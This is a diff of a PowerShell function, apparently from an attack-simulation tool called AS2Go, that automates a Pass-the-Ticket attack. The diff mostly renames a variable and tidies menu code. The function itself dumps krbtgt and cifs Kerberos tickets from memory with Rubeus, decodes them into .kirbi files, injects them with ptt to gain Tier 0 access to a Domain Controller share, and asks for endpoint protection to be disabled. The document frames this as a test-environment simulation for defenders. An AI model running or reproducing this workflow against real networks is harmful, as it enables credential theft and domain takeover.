@@ -37,14 +37,14 @@ function Invoke-PassTheTicketAttackLocalMachine {
 
     Show-CurrentPhase -Phase "ASP07_PtTLocal.html"
 
-    $tool1 = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"
+    $Rubeus = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"
     
     $TicketsToAbusePath = $Script:AS2GoTicketsDir
 
     If (-not $SkipClearHost) { Clear-Host }
 
     Write-AS2GoOutput -Type Header -Message "Pass-the-Ticket (PtT) Attack - Local Machine"
-    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack that runs completely on the local machine. `nIn this case, we dump tickets from memory with Rubeus and inject them back with Rubeus ptt, and we will try to access the Domain Controller's c$ share. `nAll steps run locally on this machine using '$tool1'.`n"
+    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack that runs completely on the local machine. `nIn this case, we dump tickets from memory with Rubeus and inject them back with Rubeus ptt, and we will try to access the Domain Controller's c$ share. `nAll steps run locally on this machine using '$Rubeus'.`n"
     Write-AS2GoOutput -Type Bullet -Message "Step #1 - run Rubeus triage on the local machine"
     Write-AS2GoOutput -Type Bullet -Message "Step #2 - dump tickets with Rubeus on the local machine"
     Write-AS2GoOutput -Type Bullet -Message "Step #3 - run PtT to become a Tier 0 Admin"
@@ -69,8 +69,7 @@ function Invoke-PassTheTicketAttackLocalMachine {
         }
 
         $title = "Is the local machine ready for the Pass-the-Ticket (PtT) attack?"
-        $message = "Please confirm that the following prerequisites are met:`n  • Rubeus.exe is present at $tool1.`n  • Endpoint protection is disabled for the tools folder in the test environment."
-
+        $message = "Please confirm that the following prerequisites are met:`n  • Rubeus.exe is present at $Rubeus.`n  • Endpoint protection is disabled for the tools folder in the test environment."
         $decision = Show-DecisionPrompt -Message $message -Options $Options -Default ($Options.Count - 1) -Title $title
 
         If ($decision -eq $Script:No) {
@@ -82,8 +81,8 @@ function Invoke-PassTheTicketAttackLocalMachine {
 
     If (-not $SkipClearHost) { Clear-Host }
 
-    If (-not (Test-Path $tool1 -PathType Leaf)) {
-        Write-AS2GoOutput -Type Error -Message "Rubeus.exe was not found at '$tool1'. Add it to the tools folder and run the setup again."
+    If (-not (Test-Path $Rubeus -PathType Leaf)) {
+        Write-AS2GoOutput -Type Error -Message "Rubeus.exe was not found at '$Rubeus'. Add it to the tools folder and run the setup again."
         Measure-FunctionRuntime -End -Details $Info
         return
     }
@@ -93,22 +92,19 @@ function Invoke-PassTheTicketAttackLocalMachine {
         New-Item -Path $TicketsToAbusePath -ItemType Directory -Force | Out-Null
     }
     else {
-        Remove-Item -Path "$TicketsToAbusePath\*.kirbi" -Force
+        Remove-Item -Path "$TicketsToAbusePath\*.kirbi" -Force -ErrorAction SilentlyContinue
     }
 
-    ###############################################################################################################################
-
     Write-AS2GoOutput -Type Header -Message "Run Rubeus triage on the local machine"
-
     Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
-    $command = "& '$tool1' triage"
+    $command = "& '$Rubeus' triage"
     Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
     #Set-MpPreference -DisableRealtimeMonitoring $true
     Try {
-        $triageText = & $tool1 triage 2>&1 | Out-String
+        $triageText = & $Rubeus triage 2>&1 | Out-String
     }
     Finally {
         #Set-MpPreference -DisableRealtimeMonitoring $false
@@ -117,18 +113,18 @@ function Invoke-PassTheTicketAttackLocalMachine {
     # Parse triage output; supports the pipe table and the legacy block format.
     # Same user name can appear in several logon sessions; merge them so the
     # candidate menu shows one entry per user and the dump uses the best session.
-    $owners = Get-RubeusTriageSessions -TriageOutput $triageText |
-        Group-Object UserName |
-        ForEach-Object {
-            # Prefer sessions that offer both a TGT and a service ticket.
-            $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true })
-            $sessions[0]
-        }
+    $BestResults = Get-RubeusTriageSessions -TriageOutput $triageText |
+    Group-Object UserName |
+    ForEach-Object {
+        # Prefer sessions that offer both a TGT and a service ticket.
+        $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true })
+        $sessions[0]
+    }
 
-    If ($owners.Count -gt 0) {
+    If ($BestResults.Count -gt 0) {
         write-host "`n"
         Write-AS2GoOutput -Type Success -Message "Rubeus triage succeeded. `
-       $($owners.Count) user logon sessions with Kerberos tickets were found on the local machine." -NoExtraLines
+       $($BestResults.Count) user logon sessions with Kerberos tickets were found on the local machine." -NoExtraLines
     }
     else {
         Write-AS2GoOutput -Type Error -Message "Rubeus triage failed. `
@@ -138,58 +134,26 @@ function Invoke-PassTheTicketAttackLocalMachine {
         return
     }
 
-    $owners | Format-Table LUID, UserName, TGTSpn, ServiceSpn -AutoSize | out-host
+    $BestResults | Format-Table LUID, UserName, TGTSpn, ServiceSpn -AutoSize | out-host
 
-<#todo
-
-            $membership = @(
-                Get-ADPrincipalGroupMembership `
-                    -Identity $samAccountName `
-                    -Server $server |
-                Select-Object -Property Name, SID
-            )
+    $bestLocalUser = $BestResults |
+    Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
+    Select-Object -First 1
 
 
-
-#>
-pause
-
-    $bestLocalUser = $owners |
-        Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
-        Select-Object -First 1
-
+    $options = @(New-HelpOptions -InputObject $BestResults -Label 'UserName' -Help 'ServiceSpn' -Value "UserName" -AddSkip)
     $candidate = $bestLocalUser.UserName
-    If (-not $candidate) { $candidate = $owners[0].UserName }
+    $index = [array]::IndexOf($BestResults.UserName, $candidate)
+
+    
+    If (-not $candidate) { $candidate = $BestResults[0].UserName }
     Write-AS2GoOutput -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate
 
     $title = "Confirm or change the account whose tickets will be dumped"
     $message = ""
+    $candidate = Show-DecisionPrompt -Options $options -Default $index -Title $title #-Message $message
 
-    If (-not $UnAttended) {
-        $index = [array]::IndexOf($owners.UserName, $candidate)
-        If ($index -lt 0) { $index = 0 }
-        $options = @(
-            foreach ($owner in $owners) {
-                [pscustomobject] @{
-                    Label = $owner.UserName
-                    Help  = "LUID $($owner.LUID) - TGT: $(If ($owner.TGTSpn) { $owner.TGTSpn } else { 'none' }) - Service: $(If ($owner.ServiceSpn) { $owner.ServiceSpn } else { 'none' })"
-                    Value = $owner.UserName
-                }
-            }
-        )
-        $options += [pscustomobject] @{
-            Label = "&Skip"
-            Help  = "Skip the Pass-the-Ticket local machine simulation."
-            Value = $Script:No
-        }
-        $selection = Show-DecisionPrompt -Options $options -Default $index -Title $title
 
-        If ($selection -eq $Script:No) {
-            Measure-FunctionRuntime -End -Details $Info
-            return
-        }
-        $candidate = $selection
-    }
 
     If (-not $SkipClearHost) { Clear-Host }
 
@@ -197,10 +161,10 @@ pause
 
     Write-AS2GoOutput -Type Header -Message "Dump tickets with Rubeus for candidate '$candidate'"
 
-    $selectedOwner = $owners | Where-Object { $_.UserName -eq $candidate } | Select-Object -First 1
+    $selectedOwner = $BestResults | Where-Object { $_.UserName -eq $candidate } | Select-Object -First 1
 
     Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
-    $command = "& '$tool1' dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap"
+    $command = "& '$Rubeus' dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap"
     Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
@@ -210,8 +174,8 @@ pause
     Try {
         # dump prints Base64 only; /outfile is not a valid dump switch, so each
         # ticket type is dumped with /nowrap and decoded into a .kirbi file here.
-        $tgtBase64 = (& $tool1 dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap 2>&1 | Out-String)
-        $cifsBase64 = (& $tool1 dump /luid:$($selectedOwner.LUID) /service:cifs /nowrap 2>&1 | Out-String)
+        $tgtBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap 2>&1 | Out-String)
+        $cifsBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:cifs /nowrap 2>&1 | Out-String)
 
         $tgtBlob = [regex]::Match($tgtBase64, '[A-Za-z0-9+/=]{100,}').Value
         $cifsBlob = [regex]::Match($cifsBase64, '[A-Za-z0-9+/=]{100,}').Value
@@ -249,7 +213,7 @@ pause
     Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"
 
     Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
-    $command = 'Get-ChildItem "' + $TicketsToAbusePath + '\*.kirbi" | ForEach-Object { & "' + $tool1 + '" ptt /ticket:"$($_.FullName)" }'
+    $command = 'Get-ChildItem "' + $TicketsToAbusePath + '\*.kirbi" | ForEach-Object { & "' + $Rubeus + '" ptt /ticket:"$($_.FullName)" }'
     Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     If ($UnAttended) { Start-Sleep 2 } else { Pause }
@@ -257,7 +221,7 @@ pause
 
     # Rubeus ptt injects one .kirbi per call, so each file is passed separately.
     $injected = Get-ChildItem -Path "$TicketsToAbusePath\*.kirbi" -File | ForEach-Object {
-        & $tool1 ptt /ticket:"$($_.FullName)"
+        & $Rubeus ptt /ticket:"$($_.FullName)" 2>&1 | Out-String
     }
     $injected | Out-Host
 
@@ -269,7 +233,7 @@ pause
     Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
     Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     $command = "klist"
-    Write-AS2GoOutput -Type CodeSnippet -Message $command
+    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
     Set-ASConfig -Setting "LastStage" -Value $Script:PtT
     Set-NewColorSchema -NewStage $Script:PtT
